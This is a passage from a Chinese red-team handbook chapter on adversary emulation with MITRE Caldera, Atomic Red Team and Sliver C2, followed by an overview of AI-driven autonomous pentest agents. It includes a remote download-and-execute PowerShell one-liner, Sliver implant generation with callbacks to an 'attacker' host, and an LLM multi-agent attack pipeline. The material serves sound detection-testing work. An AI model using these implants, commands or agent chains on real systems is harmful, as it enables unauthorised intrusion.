## 十、攻击模拟与自动化

### 10.1 MITRE Caldera（对抗模拟编排）

```bash
# 安装运行（默认 http://localhost:8888，初始 admin/password）
git clone https://github.com/mitre/caldera.git
cd caldera
python3 server.py --fresh
# 界面：创建 agent → 上传/部署 → 跑 Operations（战术链编排）
# Caldera 能力：
# - 内建 Agent（Sandcat/Manx 等）+ C2 配置
# - Operation：把 ATT&CK 技术串成自动执行链（如 "外网打点→横向→提权"）
# - Ability：原子化技术单元（可自定义插件）
# - 与 Atomic Red Team 联动：caldera 插件加载 ART 测试
```

### 10.2 Atomic Red Team（原子测试验证检测）

```powershell
# 安装（Windows）
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
# 执行单个技术（如 Kerberoasting）
Invoke-AtomicTest T1558.003 -ShowDetails
Invoke-AtomicTest T1558.003
# 按战术批量执行（验证 SIEM/EDR 覆盖）
Invoke-AtomicTest T1558 -GetPrereqs; Invoke-AtomicTest T1558
```
> **用途**：红队/紫队确认蓝队检测覆盖率的标准化手段；每个测试对应 ATT&CK 编号，报告可直接引用。

### 10.3 Sliver C2 自动化

```bash
# 生成植入体（跨平台 Go 单文件）
sliver > generate --mtls attacker:8888 --os windows --arch amd64 --save /tmp/implant.exe
sliver > generate --http attacker --os linux --arch amd64
# 多会话管理 + 自动化
sliver > implants
sliver > use <session>
# 内置模块：portscan / pivots（Socks5/TCP 隧道）/ execute-assembly / msf 联动
sliver > generate --mtls attacker:8888 --os windows --skip-symbols --template beacon  # Beacon 模式定时回连
# 编写 sliver 脚本（.sliver 脚本批量执行命令）实现半自动化横向
```

### 10.4 AI 驱动的自动化编排（红队自动化前沿）
- **自主渗透平台**（2025-2026 成熟）：Horizon3.ai NodeZero / Pentera / Picus / Cymulate / XBOW / ARTEMIS——外部攻击面发现 + 漏洞利用验证 + 凭据滥用 + ATT&CK 多阶段链，可在数小时内完成人工数周覆盖（ARTEMIS 实测 8000 主机企业网，成本约 $18/小时）
- **AI 渗透 Agent**：PentestGPT 等 LLM 驱动的"第二大脑"（攻击路径规划、载荷生成、漏洞验证指导、报告生成）
- **编排思路**：侦察 Agent（nmap→指纹→漏洞识别）→ 规划 Agent（LLM 决策下一步）→ 执行 Agent（exp/凭据测试）→ 报告 Agent（汇总证据链）；详见第十一章

